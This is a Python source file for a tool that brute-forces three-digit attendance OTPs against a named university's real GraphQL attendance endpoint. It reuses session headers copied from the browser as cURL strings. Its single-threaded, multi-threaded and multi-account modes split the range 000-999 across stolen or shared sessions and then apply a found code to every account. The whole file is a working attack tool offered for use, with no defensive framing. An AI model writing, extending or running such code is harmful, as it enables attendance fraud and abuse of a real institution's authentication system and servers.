import requests
import time
import json
from ui import font
import threading

import keyboard
import re
import os

# Default values (fallback)
DEFAULT_URL = 'https://attendix.apu.edu.my/graphql'
DEFAULT_HEADERS = {
    'accept': 'application/json, text/plain, */*',
    'content-type': 'application/json',
    'origin': 'https://apspace.apu.edu.my',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
}

URL = DEFAULT_URL
HEADERS = DEFAULT_HEADERS

def parse_curl(curl_str):
    """
    Basic parsing of a cURL string (Chrome/Edge 'Copy as cURL' format).
    Extracts URL and Headers.
    """
    url = None
    headers = {}
    
    # 1. Clean up newlines and backslashes for multi-line pastes
    curl_str = curl_str.replace('\\\n', ' ').replace('\n', ' ')
    
    # 2. Extract URL (quoted with ' or ")
    # Matches: curl "http..." or curl 'http...'
    url_match = re.search(r"curl\s+['\"]([^'\"]+)['\"]", curl_str)
    if url_match:
        url = url_match.group(1)
        
    # 3. Extract Headers (-H 'Key: Value' or --header "Key: Value")
    # Matches: -H "Key: Value" or -H 'Key: Value'
    # Use non-capturing group for flag, then capture content inside either '...' or "..."
    header_matches = re.finditer(r"(?:-H|--header)\s+(?:'([^']*)'|\"([^\"]*)\")", curl_str)
    
    for match in header_matches:
        # Group 1 is for single-quoted strings, Group 2 for double-quoted
        header_part = match.group(1) if match.group(1) is not None else match.group(2)
        
        if header_part and ':' in header_part:
            key, value = header_part.split(':', 1)
            headers[key.strip().lower()] = value.strip()
            
    return url, headers

def load_config():
    """Loads cURL config from Input/temp.txt if available"""
    global URL, HEADERS
    
    input_path = os.path.join(os.getcwd(), 'Input', 'temp.txt')
    
    if os.path.exists(input_path):
        try:
            with open(input_path, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    parsed_url, parsed_headers = parse_curl(content)
                    
                    if parsed_url:
                        URL = parsed_url
                        print(font(f" [Config] Loaded URL: {URL}", color="green"))
                    
                    if parsed_headers:
                        HEADERS = parsed_headers
                        print(font(f" [Config] Loaded {len(HEADERS)} headers.", color="green"))
                    else:
                         print(font(" [Config] No headers found in file. Using defaults.", color="yellow"))

        except Exception as e:
            print(font(f" [Config] Error reading Input/temp.txt: {e}", color="red"))
    else:
        print(font(" [Config] Input/temp.txt not found.", color="red"))
        print(font(" [Config] Please configure the request in the main menu.", color="yellow"))
        return False
        
    return True

import concurrent.futures


def check_otp(otp, url=None, headers=None):
    # Use passed values or fallback to globals (though ideally we always pass them now)
    target_url = url if url else URL
    target_headers = headers if headers else HEADERS

    payload = {
        "operationName": "updateAttendance",
        "variables": {"otp": otp},
        "query": "mutation updateAttendance($otp: String!) {\n  updateAttendance(otp: $otp) {\n    id\n    attendance\n    classcode\n    date\n    startTime\n    endTime\n    classType\n    __typename\n  }\n}\n"
    }
    try:
        response = requests.post(target_url, headers=target_headers, json=payload)
        return response.json(), None
    except Exception as e:
        return None, e

import random

def run_attack_core(target_url, target_headers, num_threads, cooldown, account_name="Unknown", stop_event=None, print_lock=None, range_start=0, range_end=1000, shared_context=None):
    """
    Core function to run the multi-threaded attack for a specific configuration.
    args:
        stop_event: Optional threading.Event shared across accounts. If None, creates local one.
        print_lock: Optional threading.Lock shared across accounts. If None, creates local one.
        range_start: Start of OTP range (inclusive).
        range_end: End of OTP range (exclusive).
        shared_context: Optional dict {'found_otp': None} shared across accounts.
    """
    # Setup synchronization primitives
    is_main_monitor = False
    if stop_event is None:
        stop_event = threading.Event()
        is_main_monitor = True # Only this instance should monitor keyboard
    
    if print_lock is None:
        print_lock = threading.Lock()

    with print_lock:
        print(font(f"\n [Attack] Starting for: {account_name} ", color="yellow", inverse=True))
        print(font(f" [{account_name}] Range: {range_start:03d}-{range_end-1:03d} | Threads: {num_threads} | Cooldown: {cooldown}s ", color="cyan"))
    
    # Internal separate event for success to stop just this account's threads?
    # Actually if one account succeeds, we probably don't want to stop ALL accounts if they are different?
    # BUT usually brute forcing is for one specific outcome. 
    # Let's assume finding an OTP for ONE account shouldn't stop OTHERS.
    # So we need a local success event.
    success_event = threading.Event()
    
    found_otp = [None]  # Use list to allow modification in closure
    
    # Generate Sequential List for assigned range
    all_otps = [f"{i:03d}" for i in range(range_start, range_end)]
    
    def worker_thread(thread_id, allocated_otps):
        """Worker thread to check a specific list of OTPs"""
        for otp in allocated_otps:
            # Check if we should stop
            if stop_event.is_set() or success_event.is_set():
                return
            
            # Check Shared Context for globally found OTP
            if shared_context and shared_context.get('found_otp'):
                global_otp = shared_context['found_otp']
                # If we haven't found it locally yet, try to use the global one
                if not found_otp[0]:
                    with print_lock:
                         print(font(f" [{account_name}] [Thread {thread_id}] detected Global Found OTP: {global_otp}. Syncing...", color="magenta"))
                    
                    # Try to apply the found OTP to this account
                    resp, err = check_otp(global_otp, url=target_url, headers=target_headers)
                    with print_lock:
                        if resp and 'data' in resp and resp['data'] and resp['data'].get('updateAttendance'):
                             print(font(f" [{account_name}] [Thread {thread_id}] [SYNC SUCCESS] OTP Validated: {global_otp} ", color="green", inverse=True))
                             found_otp[0] = global_otp
                        else:
                             print(font(f" [{account_name}] [Thread {thread_id}] [SYNC FAILED] Global OTP {global_otp} was rejected.", color="red"))
                    
                    success_event.set()
                return

            # Make request
            response_json, error = check_otp(otp, url=target_url, headers=target_headers)
            
            if error:
                with print_lock:
                    print(font(f" [{account_name}] [Thread {thread_id}] [ERROR] {otp}: {error}", color="red"))
            else:
                # Check for success
                if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
                    with print_lock:
                        print(font(f"\n [{account_name}] [Thread {thread_id}] [SUCCESS] OTP Found: {otp} ", color="green", inverse=True))
                        found_otp[0] = otp
                    
                    # Update global context
                    if shared_context:
                        shared_context['found_otp'] = otp
                        
                    success_event.set()  # Signal all threads for THIS account to stop
                    return
                
                # Check for errors
                elif 'errors' in response_json:
                    error_msg = response_json['errors'][0]['message']
                    with print_lock:
                        if "You are not registered to this class" in error_msg:
                            print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} - Not Result")
                        else:
                            print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} - {error_msg}")
                else:
                    with print_lock:
                        print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} (Unknown response)")
            
            # Cooldown for this thread
            slept = 0
            while slept < cooldown:
                if stop_event.is_set() or success_event.is_set():
                    return
                # Check shared context during sleep too for faster reaction
                if shared_context and shared_context.get('found_otp'):
                     # We can just return, let the next loop iteration handle the sync logic or simply exit
                     # Actually, to trigger the sync logic, we should probably break to the top of the loop or re-call logic.
                     # But cleanest is to let top of loop handle it.
                     pass 
                     
                time.sleep(0.05)
                slept += 0.05
        
        with print_lock:
            # Only print if we didn't succeed/cancel
            if not stop_event.is_set() and not success_event.is_set():
                print(font(f" [{account_name}] [Thread {thread_id}] Completed assigned chunk", color="cyan"))
    
    # Distribute the randomized OTPs to chunks
    chunk_size = len(all_otps) // num_threads
    threads = []
    
    for i in range(num_threads):
        start_idx = i * chunk_size
        # Last thread gets any remainder
        end_idx = (i + 1) * chunk_size if i < num_threads - 1 else len(all_otps)
        
        chunk = all_otps[start_idx:end_idx]
        
        thread = threading.Thread(target=worker_thread, args=(i+1, chunk))
        thread.daemon = True
        threads.append(thread)
    
    # Start all threads
    with print_lock:
        print(font(f" [{account_name}] Threads running...", color="cyan"))
    
    for thread in threads:
        thread.start()
    
    # Monitor Logic
    try:
        while any(t.is_alive() for t in threads):
            # If we are the main monitor (single mode), we check keyboard
            if is_main_monitor:
                if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
                    with print_lock:
                        print(font("\n\n [!] User Cancellation Requested ", color="yellow", inverse=True))
                    stop_event.set()
                    break
            else:
                # In multi-mode, we just check if the external stop event happened
                if stop_event.is_set():
                    break
            
            # Also check success event
            if success_event.is_set():
                break

            time.sleep(0.1)
            
    except KeyboardInterrupt:
        if is_main_monitor:
            with print_lock:
                print(font("\n\n [!] Keyboard Interrupt ", color="yellow", inverse=True))
            stop_event.set()
    
    # Wait for all threads to finish
    # We don't print "Waiting for threads..." here to avoid spam in multi-mode
    for thread in threads:
        thread.join(timeout=2.0)
    
    # Final results
    if found_otp[0]:
        with print_lock:
            print(font(f"\n [{account_name}] [FINAL RESULT] OTP Found: {found_otp[0]} ", color="green", inverse=True))
    elif stop_event.is_set():
        with print_lock:
            print(font(f" [{account_name}] Stopped.", color="yellow"))
    else:
        with print_lock:
            print(font(f"\n [{account_name}] Finished range.", color="cyan"))

    return found_otp[0]

def start():
    if not load_config():
        input(" Press Enter to return to menu...")
        return
    # Prompt for cooldown
    try:
        cooldown_input = input(" Enter cooldown in seconds (default 1.0): ")
        cooldown = float(cooldown_input) if cooldown_input.strip() else 1.0
    except ValueError:
        print(" Invalid input. Using default 1.0s.")
        cooldown = 1.0

    print(font(f"\n Starting Bruteforce Attack (Cooldown: {cooldown}s)...", color="yellow", inverse=True))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        for i in range(1000):
            if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
                print(font("\n [!] Process Cancelled ", color="yellow", inverse=True))
                time.sleep(2)
                return

            otp = f"{i:03d}"
            
            # Submit the request to a separate thread
            future = executor.submit(check_otp, otp, URL, HEADERS)

            # Wait for completion or interrupt
            while not future.done():
                if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
                    print(font("\n [!] Process Cancelled ", color="yellow", inverse=True))
                    time.sleep(2)
                    return
                time.sleep(0.05)

            # Process result
            response_json, error = future.result()

            if error:
                print(font(f" [ERROR] Request failed for {otp}: {error}", color="red"))
            else:
                if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
                    print(font(f" [SUCCESS] OTP Found: {otp} ", color="green", inverse=True))
                    break 
                elif 'errors' in response_json:
                    error_msg = response_json['errors'][0]['message']
                    if "You are not registered to this class" in error_msg:
                         print(f" [FAILED] {otp} - Not Result")
                    else:
                         print(f" [FAILED] {otp} - {error_msg}")
                else:
                    print(f" [FAILED] {otp} (Unknown response)")

            slept = 0
            while slept < cooldown:
                if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
                    print(font("\n [!] Process Cancelled ", color="yellow", inverse=True))
                    time.sleep(2)
                    return
                time.sleep(0.05)
                slept += 0.05

    print(font("\n Bruteforce Complete.", color="cyan", inverse=True))
    input(" Press Enter to return to menu...")

def start_experimental():
    if not load_config():
        input(" Press Enter to return to menu...")
        return
    """Multi-threaded experimental bruteforce mode"""
    
    # Prompt for thread count
    try:
        thread_input = input(" Enter number of threads (default 4, max 100): ")
        num_threads = int(thread_input) if thread_input.strip() else 4
        if num_threads < 1 or num_threads > 100:
            print(" Invalid thread count. Using default 4.")
            num_threads = 4
    except ValueError:
        print(" Invalid input. Using default 4 threads.")
        num_threads = 4
    
    # Prompt for per-thread cooldown
    try:
        cooldown_input = input(" Enter per-thread cooldown in seconds (default 0.5): ")
        cooldown = float(cooldown_input) if cooldown_input.strip() else 0.5
    except ValueError:
        print(" Invalid input. Using default 0.5s.")
        cooldown = 0.5
    
    run_attack_core(URL, HEADERS, num_threads, cooldown, account_name="Main Config")
    
    input("\n Press Enter to return to menu...")

def load_config_from_file(file_path):
    """Helper to load config from a specific file path"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            if content:
                parsed_url, parsed_headers = parse_curl(content)
                return parsed_url, parsed_headers
    except Exception as e:
        print(font(f" [Config] Error reading {file_path}: {e}", color="red"))
    return None, None

def run_multi_account_attack():
    """Concurrently iterates through Input/SavedRequests and runs attack for each."""
    saved_requests_dir = os.path.join(os.getcwd(), 'Input', 'SavedRequests')
    
    if not os.path.exists(saved_requests_dir):
        print(font(" [INFO] No SavedRequests folder found. Create it and add requests via the menu.", color="yellow"))
        input(" Press Enter to return...")
        return

    files = [f for f in os.listdir(saved_requests_dir) if f.endswith('.txt')]
    
    if not files:
        print(font(" [INFO] No saved requests found in Input/SavedRequests.", color="yellow"))
        input(" Press Enter to return...")
        return
        
    count_accounts = len(files)
    print(font(f"\n Found {count_accounts} accounts to attack.", color="cyan", inverse=True))
    for f in files:
        print(f" - {f}")
        
    # Ask for settings once
    try:
        thread_input = input("\n Enter number of threads PER ACCOUNT (default 4): ")
        num_threads = int(thread_input) if thread_input.strip() else 4
    except:
        num_threads = 4
        
    try:
        cooldown_input = input(" Enter per-thread cooldown (default 0.5): ")
        cooldown = float(cooldown_input) if cooldown_input.strip() else 0.5
    except:
        cooldown = 0.5

    # Divide global range (1000) by number of accounts
    total_otps = 1000
    range_per_account = total_otps // count_accounts
    
    print(font("\n Starting Distributed Multi-Account Attack Sequence...", color="white", inverse=True))
    print(font(f" Strategy: Distributed 000-999 across {count_accounts} accounts.", color="magenta"))
    print(font(" Press 'q' or 'esc' to stop ALL attacks.", color="yellow"))
    
    shared_stop_event = threading.Event()
    shared_print_lock = threading.Lock()
    
    # Shared context to store the found OTP
    shared_context = {'found_otp': None}
    
    results = {}
    
    # Wrapper helper to run in thread and capture result
    def attack_wrapper(acc_name, conf_url, conf_headers, start_r, end_r):
        res = run_attack_core(conf_url, conf_headers, num_threads, cooldown, 
                              account_name=acc_name, 
                              stop_event=shared_stop_event, 
                              print_lock=shared_print_lock,
                              range_start=start_r,
                              range_end=end_r,
                              shared_context=shared_context)
        results[acc_name] = res if res else "Failed"

    account_threads = []

    for i, filename in enumerate(files):
        file_path = os.path.join(saved_requests_dir, filename)
        account_name = os.path.splitext(filename)[0]
        
        # Calculate range for this account
        start_r = i * range_per_account
        # Last account grabs the remainder up to 1000
        end_r = (i + 1) * range_per_account if i < count_accounts - 1 else total_otps
        
        url, headers = load_config_from_file(file_path)
        
        if not url or not headers:
            with shared_print_lock:
                print(font(f" [SKIP] Could not load config for {account_name}", color="red"))
            results[account_name] = "Failed to load config"
            continue
            
        t = threading.Thread(target=attack_wrapper, args=(account_name, url, headers, start_r, end_r))
        t.daemon = True
        account_threads.append(t)
        t.start()
        
        # Stagger starts slightly to avoid instantaneous blast
        time.sleep(0.1)

    # Main monitoring loop for cancellation
    try:
        while any(t.is_alive() for t in account_threads):
            if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
                with shared_print_lock:
                    print(font("\n\n [!] Stopping All Attacks... ", color="red", inverse=True))
                shared_stop_event.set()
                break # Break monitor loop, wait for threads to join
            time.sleep(0.1)
    except KeyboardInterrupt:
        with shared_print_lock:
            print(font("\n\n [!] Keyboard Interrupt. Stopping... ", color="red", inverse=True))
        shared_stop_event.set()

    # Wait for all account threads
    for t in account_threads:
        t.join(timeout=5.0) # Give them time to clean up
        
    print(font("\n === Multi-Account Attack Summary === ", color="green", inverse=True))
    for filename in files:
        acc = os.path.splitext(filename)[0]
        res = results.get(acc, "Unknown/Cancelled")
        color = "green" if res != "Failed" and "Failed" not in str(res) and "Cancelled" not in str(res) else "red"
        print(font(f" {acc}: {res}", color=color))

    input("\n Press Enter to return to menu...")


def test_connection():
    if not load_config():
        input(" Press Enter to return to menu...")
        return
    print(font("\n Testing Connection...", color="yellow", inverse=True))
    
    otp = input(" Enter OTP to test (3 digits): ")
    if not otp: otp = "000"

    payload = {
        "operationName": "updateAttendance",
        "variables": {"otp": otp},
        "query": "mutation updateAttendance($otp: String!) {\n  updateAttendance(otp: $otp) {\n    id\n    attendance\n    classcode\n    date\n    startTime\n    endTime\n    classType\n    __typename\n  }\n}\n"
    }

    try:
        start_time = time.time()
        response = requests.post(URL, headers=HEADERS, json=payload)
        elapsed = time.time() - start_time
        
        print(font(f"\n [STATUS] HTTP {response.status_code}", color="cyan" if response.status_code == 200 else "red"))
        print(f" Time: {elapsed:.2f}s")
        
        print("\n [HEADERS]")
        for k, v in response.headers.items():
            print(f" {k}: {v}")
            
        print("\n [BODY]")
        try:
            response_json = response.json()
            print(json.dumps(response_json, indent=2))

            print("\n [RESULT]")
            if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
                print(font(f" [SUCCESS] OTP Valid: {otp}", color="green", inverse=True))
            elif 'errors' in response_json:
                error_msg = response_json['errors'][0]['message']
                if "You are not registered to this class" in error_msg:
                     print(font(f" [FAILED] {otp} - Not Result", color="red"))
                else:
                     print(font(f" [FAILED] {otp} - {error_msg}", color="red"))
            else:
                print(font(f" [FAILED] {otp} (Unknown response)", color="red"))

        except:
            print(response.text)
            print(font(f"\n [FAILED] Could not parse JSON response.", color="red"))
            
    except Exception as e:
        print(font(f"\n [ERROR] Connection failed: {e}", color="red"))

    input("\n Press Enter to return to menu...")
